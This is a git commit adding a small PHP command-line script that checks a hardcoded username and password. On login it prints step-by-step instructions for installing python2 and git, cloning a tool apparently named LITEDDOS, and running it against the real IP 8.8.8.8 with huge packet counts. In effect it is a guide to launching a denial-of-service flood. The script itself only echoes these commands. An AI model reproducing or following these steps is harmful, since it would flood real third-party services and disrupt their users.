e09a281b4c4935f4738366991518fb635a8a4d98
Damar-123 <68603556+Damar-123@users.noreply.github.com>
2020-07-21 22:32:17 +0700

    Add files via upload

---
+++ plosok.php
@@ -0,0 +1,75 @@
+<?php 
+$username = "damar";
+$password = "plosok";
+
+
+system('clear');
+echo"Script Buatan Damar\n";
+
+echo"username : ";
+$user = trim(fgets(STDIN));
+echo"password : ";
+$pass = trim(fgets(STDIN));
+
+if($user == $username && $pass == $password)
+{
+
+echo"login sukses\n";
+
+sleep(2);
+
+echo"
+
+pkg update\n";
+
+echo"
+
+pkg upgrade\n";
+
+echo"
+
+pkg install python2\n";
+
+echo"
+
+pkg install git\n";
+
+echo"
+
+git clone https://github.com/4L13199/LITEDDOS\n";
+
+echo"
+
+cd LITEDDOS\n";
+
+echo"
+
+python2 LITEDDOS.py\n";
+
+echo"
+
+python2 LITEDDOS.py 8.8.8.8 354 99999999\n";
+
+echo"
+
+
+
+
+SELESAI! DAMAR MENGUCAPKAN SELAMAT IBADAH NGAJI\n";
+
+
+
+}
+else
+{
+
+echo"login gagal\n";
+
+}
+
+
+
+
+
+
+?>
